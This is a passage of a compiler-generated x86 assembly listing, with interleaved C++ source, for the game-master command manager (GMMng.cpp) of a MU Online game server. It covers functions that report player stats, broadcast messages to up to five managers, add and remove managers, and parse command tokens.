  00055	83 c4 0c	 add	 esp, 12			; 0000000cH
  00058	e9 17 01 00 00	 jmp	 $LN1@GetUserAbi
$LN2@GetUserAbi:

; 4531 : 	
; 4532 : 	nIndex = gObjGetIndex( const_cast<LPSTR>(lpszName) );

  0005d	8b 45 0c	 mov	 eax, DWORD PTR _lpszName$[ebp]
  00060	50		 push	 eax
  00061	e8 00 00 00 00	 call	 ?gObjGetIndex@@YAHPAD@Z	; gObjGetIndex
  00066	83 c4 04	 add	 esp, 4
  00069	89 45 f0	 mov	 DWORD PTR _nIndex$[ebp], eax

; 4533 : 	ERROR_RETURN(nIndex > 0, GCServerMsgStringSend("Result-User Not Found", lpObj->m_Index, 1) );

  0006c	83 7d f0 00	 cmp	 DWORD PTR _nIndex$[ebp], 0
  00070	7f 1a		 jg	 SHORT $LN3@GetUserAbi
  00072	6a 01		 push	 1
  00074	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00077	8b 08		 mov	 ecx, DWORD PTR [eax]
  00079	51		 push	 ecx
  0007a	68 00 00 00 00	 push	 OFFSET ??_C@_0BG@GPJEKBCF@Result?9User?5Not?5Found@
  0007f	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  00084	83 c4 0c	 add	 esp, 12			; 0000000cH
  00087	e9 e8 00 00 00	 jmp	 $LN1@GetUserAbi
$LN3@GetUserAbi:

; 4534 : 	lpTargetObj = &gObj[nIndex];

  0008c	69 45 f0 a0 1b
	00 00		 imul	 eax, DWORD PTR _nIndex$[ebp], 7072
  00093	03 05 00 00 00
	00		 add	 eax, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  00099	89 45 f4	 mov	 DWORD PTR _lpTargetObj$[ebp], eax

; 4535 : 
; 4536 : 	wsprintf(szMsg, "Result-Ability(%s)", lpszName);

  0009c	8b 45 0c	 mov	 eax, DWORD PTR _lpszName$[ebp]
  0009f	50		 push	 eax
  000a0	68 00 00 00 00	 push	 OFFSET ??_C@_0BD@CFKKKGDI@Result?9Ability?$CI?$CFs?$CJ@
  000a5	8d 8d f0 fe ff
	ff		 lea	 ecx, DWORD PTR _szMsg$[ebp]
  000ab	51		 push	 ecx
  000ac	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__wsprintfA
  000b2	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4537 : 	GCServerMsgStringSend(szMsg, lpObj->m_Index, 1);

  000b5	6a 01		 push	 1
  000b7	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  000ba	8b 08		 mov	 ecx, DWORD PTR [eax]
  000bc	51		 push	 ecx
  000bd	8d 95 f0 fe ff
	ff		 lea	 edx, DWORD PTR _szMsg$[ebp]
  000c3	52		 push	 edx
  000c4	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  000c9	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4538 : 	{
; 4539 : 		int nAttackDamage = 0;

  000cc	c7 85 ec fe ff
	ff 00 00 00 00	 mov	 DWORD PTR _nAttackDamage$1[ebp], 0

; 4540 : 
; 4541 : 		ZeroMemory(szMsg, 256);

  000d6	68 00 01 00 00	 push	 256			; 00000100H
  000db	6a 00		 push	 0
  000dd	8d 85 f0 fe ff
	ff		 lea	 eax, DWORD PTR _szMsg$[ebp]
  000e3	50		 push	 eax
  000e4	e8 00 00 00 00	 call	 _memset
  000e9	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4542 : 
; 4543 : #ifdef GMCOMMAND_EX_1ST_BUGFIX
; 4544 : 		if (lpTargetObj->Class >= CLASS_WIZARD && lpTargetObj->Class <= CLASS_SUMMONER)
; 4545 : 		{
; 4546 : 			char szClass[6][20] = {"WIZARD", "KNIGHT", "ELF", "MAGUMSA", "DARKLORD", "SUMMONER"};
; 4547 : 			wsprintf(szMsg, "Class:%s", szClass[lpTargetObj->Class]);
; 4548 : 			GCServerMsgStringSend(szMsg, lpObj->m_Index, 1);
; 4549 : 		}
; 4550 : 
; 4551 : 		ZeroMemory(szMsg, 256);
; 4552 : 		wsprintf(szMsg, "Strength[%d] Dexterity[%d] Vitality[%d] Energy[%d] Leadership[%d]"
; 4553 : 			, lpTargetObj->Strength+lpTargetObj->AddStrength, lpTargetObj->Dexterity+lpTargetObj->AddDexterity
; 4554 : 			, lpTargetObj->Vitality+lpTargetObj->AddVitality, lpTargetObj->Energy+lpTargetObj->AddEnergy
; 4555 : 			, lpTargetObj->Leadership+lpTargetObj->AddLeadership);
; 4556 : #else
; 4557 : 		wsprintf(szMsg, "Strength[%d] Dexterity[%d] Vitality[%d] Energy[%d]"

  000ec	8b 45 f4	 mov	 eax, DWORD PTR _lpTargetObj$[ebp]
  000ef	0f b7 88 ba 00
	00 00		 movzx	 ecx, WORD PTR [eax+186]
  000f6	8b 55 f4	 mov	 edx, DWORD PTR _lpTargetObj$[ebp]
  000f9	0f b7 82 e6 00
	00 00		 movzx	 eax, WORD PTR [edx+230]
  00100	03 c8		 add	 ecx, eax
  00102	51		 push	 ecx
  00103	8b 4d f4	 mov	 ecx, DWORD PTR _lpTargetObj$[ebp]
  00106	0f b7 91 b8 00
	00 00		 movzx	 edx, WORD PTR [ecx+184]
  0010d	8b 45 f4	 mov	 eax, DWORD PTR _lpTargetObj$[ebp]
  00110	0f b7 88 e4 00
	00 00		 movzx	 ecx, WORD PTR [eax+228]
  00117	03 d1		 add	 edx, ecx
  00119	52		 push	 edx
  0011a	8b 55 f4	 mov	 edx, DWORD PTR _lpTargetObj$[ebp]
  0011d	0f b7 82 b6 00
	00 00		 movzx	 eax, WORD PTR [edx+182]
  00124	8b 4d f4	 mov	 ecx, DWORD PTR _lpTargetObj$[ebp]
  00127	0f b7 91 e2 00
	00 00		 movzx	 edx, WORD PTR [ecx+226]
  0012e	03 c2		 add	 eax, edx
  00130	50		 push	 eax
  00131	8b 45 f4	 mov	 eax, DWORD PTR _lpTargetObj$[ebp]
  00134	0f b7 88 b4 00
	00 00		 movzx	 ecx, WORD PTR [eax+180]
  0013b	8b 55 f4	 mov	 edx, DWORD PTR _lpTargetObj$[ebp]
  0013e	0f b7 82 e0 00
	00 00		 movzx	 eax, WORD PTR [edx+224]
  00145	03 c8		 add	 ecx, eax
  00147	51		 push	 ecx
  00148	68 00 00 00 00	 push	 OFFSET ??_C@_0DD@MBBAAJDL@Strength?$FL?$CFd?$FN?5Dexterity?$FL?$CFd?$FN?5Vita@
  0014d	8d 8d f0 fe ff
	ff		 lea	 ecx, DWORD PTR _szMsg$[ebp]
  00153	51		 push	 ecx
  00154	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__wsprintfA
  0015a	83 c4 18	 add	 esp, 24			; 00000018H

; 4558 : 			, lpTargetObj->Strength+lpTargetObj->AddStrength, lpTargetObj->Dexterity+lpTargetObj->AddDexterity
; 4559 : 			, lpTargetObj->Vitality+lpTargetObj->AddVitality, lpTargetObj->Energy+lpTargetObj->AddEnergy);
; 4560 : #endif // GMCOMMAND_EX_1ST_BUGFIX
; 4561 : 
; 4562 : 		GCServerMsgStringSend(szMsg, lpObj->m_Index, 1);

  0015d	6a 01		 push	 1
  0015f	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00162	8b 08		 mov	 ecx, DWORD PTR [eax]
  00164	51		 push	 ecx
  00165	8d 95 f0 fe ff
	ff		 lea	 edx, DWORD PTR _szMsg$[ebp]
  0016b	52		 push	 edx
  0016c	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  00171	83 c4 0c	 add	 esp, 12			; 0000000cH
$LN1@GetUserAbi:

; 4563 : 	}
; 4564 : }

  00174	5f		 pop	 edi
  00175	5e		 pop	 esi
  00176	5b		 pop	 ebx
  00177	8b 4d fc	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  0017a	33 cd		 xor	 ecx, ebp
  0017c	e8 00 00 00 00	 call	 @__security_check_cookie@4
  00181	8b e5		 mov	 esp, ebp
  00183	5d		 pop	 ebp
  00184	c2 08 00	 ret	 8
?_GetUserAbility@CGMMng@@AAEXPAVOBJECTSTRUCT@@PBD@Z ENDP ; CGMMng::_GetUserAbility
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ?DataSend@CGMMng@@QAEXPAEH@Z
_TEXT	SEGMENT
_n$1 = -8						; size = 4
_this$ = -4						; size = 4
_szMsg$ = 8						; size = 4
_size$ = 12						; size = 4
?DataSend@CGMMng@@QAEXPAEH@Z PROC			; CGMMng::DataSend, COMDAT
; _this$ = ecx

; 645  : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 48	 sub	 esp, 72			; 00000048H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 646  : 	for( int n=0; n<MAX_MANAGER; n++)

  0000c	c7 45 f8 00 00
	00 00		 mov	 DWORD PTR _n$1[ebp], 0
  00013	eb 09		 jmp	 SHORT $LN4@DataSend
$LN2@DataSend:
  00015	8b 45 f8	 mov	 eax, DWORD PTR _n$1[ebp]
  00018	83 c0 01	 add	 eax, 1
  0001b	89 45 f8	 mov	 DWORD PTR _n$1[ebp], eax
$LN4@DataSend:
  0001e	83 7d f8 05	 cmp	 DWORD PTR _n$1[ebp], 5
  00022	7d 30		 jge	 SHORT $LN1@DataSend

; 647  : 	{
; 648  : 		if( ManagerIndex[n] != -1 )

  00024	8b 45 f8	 mov	 eax, DWORD PTR _n$1[ebp]
  00027	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0002a	83 bc 81 78 31
	00 00 ff	 cmp	 DWORD PTR [ecx+eax*4+12664], -1
  00032	74 1e		 je	 SHORT $LN5@DataSend

; 649  : 		{
; 650  : 			::DataSend(ManagerIndex[n], szMsg, size);

  00034	8b 45 0c	 mov	 eax, DWORD PTR _size$[ebp]
  00037	50		 push	 eax
  00038	8b 4d 08	 mov	 ecx, DWORD PTR _szMsg$[ebp]
  0003b	51		 push	 ecx
  0003c	8b 55 f8	 mov	 edx, DWORD PTR _n$1[ebp]
  0003f	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00042	8b 8c 90 78 31
	00 00		 mov	 ecx, DWORD PTR [eax+edx*4+12664]
  00049	51		 push	 ecx
  0004a	e8 00 00 00 00	 call	 ?DataSend@@YAHHPAEK@Z	; DataSend
  0004f	83 c4 0c	 add	 esp, 12			; 0000000cH
$LN5@DataSend:

; 651  : 		}
; 652  : 	}

  00052	eb c1		 jmp	 SHORT $LN2@DataSend
$LN1@DataSend:

; 653  : }

  00054	5f		 pop	 edi
  00055	5e		 pop	 esi
  00056	5b		 pop	 ebx
  00057	8b e5		 mov	 esp, ebp
  00059	5d		 pop	 ebp
  0005a	c2 08 00	 ret	 8
?DataSend@CGMMng@@QAEXPAEH@Z ENDP			; CGMMng::DataSend
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ?BattleInfoSend@CGMMng@@QAEXPADE0E@Z
_TEXT	SEGMENT
_n$1 = -8						; size = 4
_this$ = -4						; size = 4
_Name1$ = 8						; size = 4
_score1$ = 12						; size = 1
_Name2$ = 16						; size = 4
_score2$ = 20						; size = 1
?BattleInfoSend@CGMMng@@QAEXPADE0E@Z PROC		; CGMMng::BattleInfoSend, COMDAT
; _this$ = ecx

; 656  : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 48	 sub	 esp, 72			; 00000048H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 657  : 	for( int n=0; n<MAX_MANAGER; n++)

  0000c	c7 45 f8 00 00
	00 00		 mov	 DWORD PTR _n$1[ebp], 0
  00013	eb 09		 jmp	 SHORT $LN4@BattleInfo
$LN2@BattleInfo:
  00015	8b 45 f8	 mov	 eax, DWORD PTR _n$1[ebp]
  00018	83 c0 01	 add	 eax, 1
  0001b	89 45 f8	 mov	 DWORD PTR _n$1[ebp], eax
$LN4@BattleInfo:
  0001e	83 7d f8 05	 cmp	 DWORD PTR _n$1[ebp], 5
  00022	7d 3a		 jge	 SHORT $LN1@BattleInfo

; 658  : 	{
; 659  : 		if( ManagerIndex[n] != -1 )

  00024	8b 45 f8	 mov	 eax, DWORD PTR _n$1[ebp]
  00027	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0002a	83 bc 81 78 31
	00 00 ff	 cmp	 DWORD PTR [ecx+eax*4+12664], -1
  00032	74 28		 je	 SHORT $LN5@BattleInfo

; 660  : 		{
; 661  : 			GCGoalSend(ManagerIndex[n], Name1, score1, Name2, score2);

  00034	0f b6 45 14	 movzx	 eax, BYTE PTR _score2$[ebp]
  00038	50		 push	 eax
  00039	8b 4d 10	 mov	 ecx, DWORD PTR _Name2$[ebp]
  0003c	51		 push	 ecx
  0003d	0f b6 55 0c	 movzx	 edx, BYTE PTR _score1$[ebp]
  00041	52		 push	 edx
  00042	8b 45 08	 mov	 eax, DWORD PTR _Name1$[ebp]
  00045	50		 push	 eax
  00046	8b 4d f8	 mov	 ecx, DWORD PTR _n$1[ebp]
  00049	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  0004c	8b 84 8a 78 31
	00 00		 mov	 eax, DWORD PTR [edx+ecx*4+12664]
  00053	50		 push	 eax
  00054	e8 00 00 00 00	 call	 ?GCGoalSend@@YAXHPADE0E@Z ; GCGoalSend
  00059	83 c4 14	 add	 esp, 20			; 00000014H
$LN5@BattleInfo:

; 662  : 		}
; 663  : 	}

  0005c	eb b7		 jmp	 SHORT $LN2@BattleInfo
$LN1@BattleInfo:

; 664  : }

  0005e	5f		 pop	 edi
  0005f	5e		 pop	 esi
  00060	5b		 pop	 ebx
  00061	8b e5		 mov	 esp, ebp
  00063	5d		 pop	 ebp
  00064	c2 10 00	 ret	 16			; 00000010H
?BattleInfoSend@CGMMng@@QAEXPADE0E@Z ENDP		; CGMMng::BattleInfoSend
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ?ManagerSendData@CGMMng@@QAEXPADH@Z
_TEXT	SEGMENT
_n$1 = -8						; size = 4
_this$ = -4						; size = 4
_szMsg$ = 8						; size = 4
_size$ = 12						; size = 4
?ManagerSendData@CGMMng@@QAEXPADH@Z PROC		; CGMMng::ManagerSendData, COMDAT
; _this$ = ecx

; 633  : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 48	 sub	 esp, 72			; 00000048H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 634  : 	for( int n=0; n<MAX_MANAGER; n++)

  0000c	c7 45 f8 00 00
	00 00		 mov	 DWORD PTR _n$1[ebp], 0
  00013	eb 09		 jmp	 SHORT $LN4@ManagerSen
$LN2@ManagerSen:
  00015	8b 45 f8	 mov	 eax, DWORD PTR _n$1[ebp]
  00018	83 c0 01	 add	 eax, 1
  0001b	89 45 f8	 mov	 DWORD PTR _n$1[ebp], eax
$LN4@ManagerSen:
  0001e	83 7d f8 05	 cmp	 DWORD PTR _n$1[ebp], 5
  00022	7d 2e		 jge	 SHORT $LN1@ManagerSen

; 635  : 	{
; 636  : 		if( ManagerIndex[n] != -1 )

  00024	8b 45 f8	 mov	 eax, DWORD PTR _n$1[ebp]
  00027	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0002a	83 bc 81 78 31
	00 00 ff	 cmp	 DWORD PTR [ecx+eax*4+12664], -1
  00032	74 1c		 je	 SHORT $LN5@ManagerSen

; 637  : 		{
; 638  : 			GCServerMsgStringSend(szMsg, ManagerIndex[n], 0);

  00034	6a 00		 push	 0
  00036	8b 45 f8	 mov	 eax, DWORD PTR _n$1[ebp]
  00039	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0003c	8b 94 81 78 31
	00 00		 mov	 edx, DWORD PTR [ecx+eax*4+12664]
  00043	52		 push	 edx
  00044	8b 45 08	 mov	 eax, DWORD PTR _szMsg$[ebp]
  00047	50		 push	 eax
  00048	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  0004d	83 c4 0c	 add	 esp, 12			; 0000000cH
$LN5@ManagerSen:

; 639  : 		}
; 640  : 	}

  00050	eb c3		 jmp	 SHORT $LN2@ManagerSen
$LN1@ManagerSen:

; 641  : }

  00052	5f		 pop	 edi
  00053	5e		 pop	 esi
  00054	5b		 pop	 ebx
  00055	8b e5		 mov	 esp, ebp
  00057	5d		 pop	 ebp
  00058	c2 08 00	 ret	 8
?ManagerSendData@CGMMng@@QAEXPADH@Z ENDP		; CGMMng::ManagerSendData
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ?ManagerDel@CGMMng@@QAEXPAD@Z
_TEXT	SEGMENT
_n$1 = -8						; size = 4
_this$ = -4						; size = 4
_name$ = 8						; size = 4
?ManagerDel@CGMMng@@QAEXPAD@Z PROC			; CGMMng::ManagerDel, COMDAT
; _this$ = ecx

; 618  : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 48	 sub	 esp, 72			; 00000048H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 619  : 	for( int n=0; n<MAX_MANAGER; n++)

  0000c	c7 45 f8 00 00
	00 00		 mov	 DWORD PTR _n$1[ebp], 0
  00013	eb 09		 jmp	 SHORT $LN4@ManagerDel
$LN2@ManagerDel:
  00015	8b 45 f8	 mov	 eax, DWORD PTR _n$1[ebp]
  00018	83 c0 01	 add	 eax, 1
  0001b	89 45 f8	 mov	 DWORD PTR _n$1[ebp], eax
$LN4@ManagerDel:
  0001e	83 7d f8 05	 cmp	 DWORD PTR _n$1[ebp], 5
  00022	7d 44		 jge	 SHORT $LN1@ManagerDel

; 620  : 	{
; 621  : 		if( ManagerIndex[n] != -1 )

  00024	8b 45 f8	 mov	 eax, DWORD PTR _n$1[ebp]
  00027	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0002a	83 bc 81 78 31
	00 00 ff	 cmp	 DWORD PTR [ecx+eax*4+12664], -1
  00032	74 32		 je	 SHORT $LN5@ManagerDel

; 622  : 		{
; 623  : 			if( strcmp(szManagerName[n], name) == 0 )

  00034	8b 45 08	 mov	 eax, DWORD PTR _name$[ebp]
  00037	50		 push	 eax
  00038	6b 4d f8 0b	 imul	 ecx, DWORD PTR _n$1[ebp], 11
  0003c	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  0003f	8d 84 0a 40 31
	00 00		 lea	 eax, DWORD PTR [edx+ecx+12608]
  00046	50		 push	 eax
  00047	e8 00 00 00 00	 call	 _strcmp
  0004c	83 c4 08	 add	 esp, 8
  0004f	85 c0		 test	 eax, eax
  00051	75 13		 jne	 SHORT $LN5@ManagerDel

; 624  : 			{
; 625  : 				ManagerIndex[n] = -1;

  00053	8b 45 f8	 mov	 eax, DWORD PTR _n$1[ebp]
  00056	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00059	c7 84 81 78 31
	00 00 ff ff ff
	ff		 mov	 DWORD PTR [ecx+eax*4+12664], -1

; 626  : 				return;

  00064	eb 02		 jmp	 SHORT $LN1@ManagerDel
$LN5@ManagerDel:

; 627  : 			}
; 628  : 		}
; 629  : 	}

  00066	eb ad		 jmp	 SHORT $LN2@ManagerDel
$LN1@ManagerDel:

; 630  : }

  00068	5f		 pop	 edi
  00069	5e		 pop	 esi
  0006a	5b		 pop	 ebx
  0006b	8b e5		 mov	 esp, ebp
  0006d	5d		 pop	 ebp
  0006e	c2 04 00	 ret	 4
?ManagerDel@CGMMng@@QAEXPAD@Z ENDP			; CGMMng::ManagerDel
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ?ManagerAdd@CGMMng@@QAEHPADH@Z
_TEXT	SEGMENT
_n$1 = -8						; size = 4
_this$ = -4						; size = 4
_name$ = 8						; size = 4
_aIndex$ = 12						; size = 4
?ManagerAdd@CGMMng@@QAEHPADH@Z PROC			; CGMMng::ManagerAdd, COMDAT
; _this$ = ecx

; 604  : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 48	 sub	 esp, 72			; 00000048H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 605  : 	for( int n=0; n<MAX_MANAGER; n++)

  0000c	c7 45 f8 00 00
	00 00		 mov	 DWORD PTR _n$1[ebp], 0
  00013	eb 09		 jmp	 SHORT $LN4@ManagerAdd
$LN2@ManagerAdd:
  00015	8b 45 f8	 mov	 eax, DWORD PTR _n$1[ebp]
  00018	83 c0 01	 add	 eax, 1
  0001b	89 45 f8	 mov	 DWORD PTR _n$1[ebp], eax
$LN4@ManagerAdd:
  0001e	83 7d f8 05	 cmp	 DWORD PTR _n$1[ebp], 5
  00022	7d 42		 jge	 SHORT $LN3@ManagerAdd

; 606  : 	{
; 607  : 		if( ManagerIndex[n] == -1 )

  00024	8b 45 f8	 mov	 eax, DWORD PTR _n$1[ebp]
  00027	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0002a	83 bc 81 78 31
	00 00 ff	 cmp	 DWORD PTR [ecx+eax*4+12664], -1
  00032	75 30		 jne	 SHORT $LN5@ManagerAdd

; 608  : 		{
; 609  : 			strcpy(szManagerName[n], name);

  00034	8b 45 08	 mov	 eax, DWORD PTR _name$[ebp]
  00037	50		 push	 eax
  00038	6b 4d f8 0b	 imul	 ecx, DWORD PTR _n$1[ebp], 11
  0003c	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  0003f	8d 84 0a 40 31
	00 00		 lea	 eax, DWORD PTR [edx+ecx+12608]
  00046	50		 push	 eax
  00047	e8 00 00 00 00	 call	 _strcpy
  0004c	83 c4 08	 add	 esp, 8

; 610  : 			ManagerIndex[n] = aIndex;

  0004f	8b 45 f8	 mov	 eax, DWORD PTR _n$1[ebp]
  00052	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00055	8b 55 0c	 mov	 edx, DWORD PTR _aIndex$[ebp]
  00058	89 94 81 78 31
	00 00		 mov	 DWORD PTR [ecx+eax*4+12664], edx

; 611  : 			return n;

  0005f	8b 45 f8	 mov	 eax, DWORD PTR _n$1[ebp]
  00062	eb 05		 jmp	 SHORT $LN1@ManagerAdd
$LN5@ManagerAdd:

; 612  : 		}
; 613  : 	}

  00064	eb af		 jmp	 SHORT $LN2@ManagerAdd
$LN3@ManagerAdd:

; 614  : 	return -1;

  00066	83 c8 ff	 or	 eax, -1
$LN1@ManagerAdd:

; 615  : }

  00069	5f		 pop	 edi
  0006a	5e		 pop	 esi
  0006b	5b		 pop	 ebx
  0006c	8b e5		 mov	 esp, ebp
  0006e	5d		 pop	 ebp
  0006f	c2 08 00	 ret	 8
?ManagerAdd@CGMMng@@QAEHPADH@Z ENDP			; CGMMng::ManagerAdd
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ?ManagerInit@CGMMng@@QAEXXZ
_TEXT	SEGMENT
_n$1 = -8						; size = 4
_this$ = -4						; size = 4
?ManagerInit@CGMMng@@QAEXXZ PROC			; CGMMng::ManagerInit, COMDAT
; _this$ = ecx

; 596  : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 48	 sub	 esp, 72			; 00000048H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 597  : 	for( int n=0; n<MAX_MANAGER; n++)

  0000c	c7 45 f8 00 00
	00 00		 mov	 DWORD PTR _n$1[ebp], 0
  00013	eb 09		 jmp	 SHORT $LN4@ManagerIni
$LN2@ManagerIni:
  00015	8b 45 f8	 mov	 eax, DWORD PTR _n$1[ebp]
  00018	83 c0 01	 add	 eax, 1
  0001b	89 45 f8	 mov	 DWORD PTR _n$1[ebp], eax
$LN4@ManagerIni:
  0001e	83 7d f8 05	 cmp	 DWORD PTR _n$1[ebp], 5
  00022	7d 13		 jge	 SHORT $LN1@ManagerIni

; 598  : 	{
; 599  : 		ManagerIndex[n] = -1;

  00024	8b 45 f8	 mov	 eax, DWORD PTR _n$1[ebp]
  00027	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0002a	c7 84 81 78 31
	00 00 ff ff ff
	ff		 mov	 DWORD PTR [ecx+eax*4+12664], -1

; 600  : 	}

  00035	eb de		 jmp	 SHORT $LN2@ManagerIni
$LN1@ManagerIni:

; 601  : }

  00037	5f		 pop	 edi
  00038	5e		 pop	 esi
  00039	5b		 pop	 ebx
  0003a	8b e5		 mov	 esp, ebp
  0003c	5d		 pop	 ebp
  0003d	c3		 ret	 0
?ManagerInit@CGMMng@@QAEXXZ ENDP			; CGMMng::ManagerInit
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ?GetTokenNumberEx@CGMMng@@QAEHXZ
_TEXT	SEGMENT
_szToken$ = -12						; size = 4
_seps$ = -8						; size = 2
_this$ = -4						; size = 4
?GetTokenNumberEx@CGMMng@@QAEHXZ PROC			; CGMMng::GetTokenNumberEx, COMDAT
; _this$ = ecx

; 736  : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 4c	 sub	 esp, 76			; 0000004cH
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 737  : 	char seps[] = " ";

  0000c	66 a1 00 00 00
	00		 mov	 ax, WORD PTR ??_C@_01CLKCMJKC@?5@
  00012	66 89 45 f8	 mov	 WORD PTR _seps$[ebp], ax

; 738  : 	char * szToken;
; 739  : 
; 740  : 	szToken = strtok(NULL, seps);

  00016	8d 45 f8	 lea	 eax, DWORD PTR _seps$[ebp]
  00019	50		 push	 eax
  0001a	6a 00		 push	 0
  0001c	e8 00 00 00 00	 call	 _strtok
  00021	83 c4 08	 add	 esp, 8
  00024	89 45 f4	 mov	 DWORD PTR _szToken$[ebp], eax

; 741  : 
; 742  : 	if( szToken != NULL )

  00027	83 7d f4 00	 cmp	 DWORD PTR _szToken$[ebp], 0
  0002b	74 0e		 je	 SHORT $LN2@GetTokenNu

; 743  : 	{
; 744  : 		return atoi(szToken);

  0002d	8b 45 f4	 mov	 eax, DWORD PTR _szToken$[ebp]
  00030	50		 push	 eax
  00031	e8 00 00 00 00	 call	 _atoi
  00036	83 c4 04	 add	 esp, 4
  00039	eb 03		 jmp	 SHORT $LN1@GetTokenNu
$LN2@GetTokenNu:

; 745  : 	}
; 746  : 	return -1;

  0003b	83 c8 ff	 or	 eax, -1
$LN1@GetTokenNu:

; 747  : }

  0003e	5f		 pop	 edi
  0003f	5e		 pop	 esi
  00040	5b		 pop	 ebx
  00041	8b e5		 mov	 esp, ebp
  00043	5d		 pop	 ebp
  00044	c3		 ret	 0
?GetTokenNumberEx@CGMMng@@QAEHXZ ENDP			; CGMMng::GetTokenNumberEx
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ?GetTokenNumber@CGMMng@@QAEHXZ
_TEXT	SEGMENT
_szToken$ = -12						; size = 4
_seps$ = -8						; size = 2
_this$ = -4						; size = 4
?GetTokenNumber@CGMMng@@QAEHXZ PROC			; CGMMng::GetTokenNumber, COMDAT
; _this$ = ecx

; 722  : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 4c	 sub	 esp, 76			; 0000004cH
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 723  : 	char seps[] = " ";

  0000c	66 a1 00 00 00
	00		 mov	 ax, WORD PTR ??_C@_01CLKCMJKC@?5@
  00012	66 89 45 f8	 mov	 WORD PTR _seps$[ebp], ax

; 724  : 	char * szToken;
; 725  : 
; 726  : 	szToken = strtok(NULL, seps);

  00016	8d 45 f8	 lea	 eax, DWORD PTR _seps$[ebp]
  00019	50		 push	 eax
  0001a	6a 00		 push	 0
  0001c	e8 00 00 00 00	 call	 _strtok
  00021	83 c4 08	 add	 esp, 8
  00024	89 45 f4	 mov	 DWORD PTR _szToken$[ebp], eax

; 727  : 
; 728  : 	if( szToken != NULL )

  00027	83 7d f4 00	 cmp	 DWORD PTR _szToken$[ebp], 0
  0002b	74 0e		 je	 SHORT $LN2@GetTokenNu

; 729  : 	{
; 730  : 		return atoi(szToken);

  0002d	8b 45 f4	 mov	 eax, DWORD PTR _szToken$[ebp]
  00030	50		 push	 eax
